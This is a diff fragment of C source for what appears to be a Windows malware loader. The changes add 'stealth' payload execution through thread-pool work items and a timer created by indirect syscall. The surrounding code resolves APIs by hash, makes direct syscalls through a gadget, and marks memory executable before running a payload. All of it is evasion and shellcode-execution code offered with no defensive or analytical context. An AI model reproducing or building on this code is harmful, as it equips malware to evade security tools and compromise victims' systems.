@@ -22,6 +22,44 @@ API_TABLE g_ApiTable = {0};
 static volatile BOOL g_ShouldTerminate = FALSE;
 
 // ---------------------------------------------------------------
+// NEW: Stealth Execution via ThreadPool
+// ---------------------------------------------------------------
+static BOOL QueueUserWorkItemExecute(PVOID pCode, PVOID pArgs) {
+    HMODULE hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
+    if (!hKernel32) return FALSE;
+    
+    typedef BOOL(WINAPI* TpAllocWork_t)(TP_WORK**, PTP_WORK_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
+    typedef VOID(WINAPI* TpPostWork_t)(TP_WORK*);
+    typedef VOID(WINAPI* TpReleaseWork_t)(TP_WORK*);
+
+    TpAllocWork_t pTpAllocWork = (TpAllocWork_t)ResolveApiByHash(hKernel32, HASH_TpAllocWork);
+    TpPostWork_t pTpPostWork = (TpPostWork_t)ResolveApiByHash(hKernel32, HASH_TpPostWork);
+    TpReleaseWork_t pTpReleaseWork = (TpReleaseWork_t)ResolveApiByHash(hKernel32, HASH_TpReleaseWork);
+
+    if (!pTpAllocWork || !pTpPostWork || !pTpReleaseWork) return FALSE;
+
+    TP_WORK* pWork = NULL;
+    if (!pTpAllocWork(&pWork, (PTP_WORK_CALLBACK)pCode, pArgs, NULL)) return FALSE;
+    pTpPostWork(pWork);
+    pTpReleaseWork(pWork);
+    return TRUE;
+}
+
+// ---------------------------------------------------------------
+// NEW: Stealth Timer via NtCreateTimer2
+// ---------------------------------------------------------------
+static HANDLE CreateStealthTimer() {
+    HANDLE hTimer = NULL;
+    OBJECT_ATTRIBUTES objAttr = {0};
+    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
+
+    NTSTATUS status = InvokeSyscall(g_ApiTable.syscalls.NtCreateTimer2.ssn,
+        g_SyscallGadget, &hTimer, TIMER_ALL_ACCESS, &objAttr, 0, 0);
+
+    return (status >= 0) ? hTimer : NULL;
+}
+
+// ---------------------------------------------------------------
 // Helper: Initialize all required components
 // ---------------------------------------------------------------
 static BOOL InitializeAll() {
@@ -141,8 +179,8 @@ static BOOL ExecutePayload(PVOID pTargetAddr, SIZE_T targetSize) {
     InvokeSyscall(g_ApiTable.syscalls.NtProtectVirtualMemory.ssn,
         g_SyscallGadget, (HANDLE)-1, &addr, &sz, PAGE_EXECUTE_READ, &oldProtect);
 
-    // Execute via thread‑less technique
-    ThreadlessExecute(pTargetAddr);
+    // Execute via stealthy ThreadPool work item
+    QueueUserWorkItemExecute(pTargetAddr, NULL);
 
     VirtualFree(payloadBuf, 0, MEM_RELEASE);
     return TRUE;
